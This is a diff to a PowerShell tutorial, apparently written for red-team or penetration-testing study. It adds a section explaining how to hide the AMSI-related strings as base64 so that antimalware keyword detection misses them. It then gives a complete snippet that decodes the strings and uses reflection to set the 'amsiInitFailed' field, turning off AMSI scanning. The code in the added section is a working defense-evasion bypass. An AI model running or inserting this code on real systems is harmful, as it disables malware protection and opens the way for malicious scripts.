@@ -183,7 +183,17 @@ $b64String1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes
 $b64String2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("amsiInitFailed"))
 ```
 
-> ***String1 =>*** UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==
-> ***String2 =>*** YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==
+> ***String1 =>*** "UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="
+> ***String2 =>*** "YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="
 
 ![image](./images/amsi_b64.jpg)
+
+Now let's write the script used the b64 encoded strings and decode them into a new set of cleartext strings, and then run our command using the strings instead of the cleartext strings that are on the "Dirty words" list of AMSI.
+
+```powershell
+$b64String1 = "UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="
+$b64string2 = "YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="
+$string1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String1))
+$String2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String2))
+[Ref].Assembly.GetType($string1).GetField($string2,'NonPublic,Static').SetValue($null,$true)
+```
